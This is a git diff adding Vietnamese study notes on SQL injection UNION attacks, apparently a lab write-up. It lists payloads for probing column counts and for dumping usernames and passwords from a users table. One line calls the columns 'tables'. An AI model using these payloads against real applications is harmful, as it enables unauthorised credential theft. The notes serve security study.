@@ -110,3 +110,79 @@ Bài này chỉ cần nhập input của user thêm chuỗi `'--`:
 ![img](../asset/sqli-2-SQL-injection-vulnerability-allowing-login-bypass-0.png)
 ![img](../asset/sqli-2-SQL-injection-vulnerability-allowing-login-bypass-1.png)
 ![img](../asset/sqli-2-SQL-injection-vulnerability-allowing-login-bypass-2.png)
+
+## Retrieving data from other database tables - SQL injection UNION attacks
+
+> Nhiều case kết quả trả về của query sql ở trong response của ứng dụng, attacker có thể tận dụng để lấy data của các bảng khác trong CSDL. Điều này được thực hiện bằng `UNION`
+
+Ví dụ: Nếu ứng dụng thực hiện query sau chứ input là `Gifts`:
+
+```
+SELECT name, description FROM products WHERE category = 'Gifts'
+```
+
+Attacker có thể sửa:
+
+```
+' UNION SELECT username, password FROM users--
+```
+
+-> Nó sẽ trả về tất cả username, passwd từ bảng users
+
+Ví dụ Attack SQLi Union:
+
+```
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+```
+
+Nó sẽ return một tợp hợp kết quả có 2 cột chứa cột a, b trong table1 và cột c, d trong table 2
+
+Để UNION hoạt động thì phải đáp ứng 2 yêu cầu:
+
+1. Các query riêng rẻ phải trả về cùng một số cột
+2. Kiểu dữ liệu trong mỗi cột phải tương thích giữa các query riêng lẻ
+
+Để attack thành công UNION thì phải biết:
+
+1. Có bao nhiêu cột
+2. Những loại dữ liệu của cột như string, int...
+
+**Determining the number of columns required in an SQL injection UNION attack**
+Khi thực hiện UNION attack, có 2 cách để xác định có bao nhiêu cột:
+
+1. `ORDER BY` tăng số cột tới khi lỗi:
+
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc.
+```
+
+2. Gửi payload UNION SELECT NULL:
+
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
+```
+
+Nếu số lượng `null` không phù hợp sẽ trả về lỗi như:
+
+```
+All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+```
+
+### Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+> Des: Phòng thí nghiệm này chứa lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, vì vậy bạn có thể sử dụng một cuộc tấn công UNION để lấy dữ liệu từ các bảng khác. Bước đầu tiên của một cuộc tấn công như vậy là xác định số cột đang được trả về bởi truy vấn. Sau đó, bạn sẽ sử dụng kỹ thuật này trong các phòng thí nghiệm tiếp theo để xây dựng cuộc tấn công đầy đủ.
+
+> Để giải quyết phòng thí nghiệm, hãy xác định số cột được trả về bởi truy vấn bằng cách thực hiện một cuộc tấn công SQL injection UNION trả về một hàng bổ sung chứa giá trị null.
+
+![img](../asset/sqli-3-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query-0.png)
+Bài này có 3 bảng, thêm `' ORDER BY 1` tăng dần tới 3 thì có 3 bảng: ![img](../asset/sqli-3-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query-1.png)
+![img](../asset/sqli-3-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query-2.png)
+
+C2 là thêm payload: `' UNION SELECT NULL--`, server trả về error thì thêm `, NULL` tới khi trả về response 200:
+![img](../asset/sqli-3-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query-3.png) ![img](../asset/sqli-3-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query-4.png) ![img](../asset/sqli-3-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query-5.png)
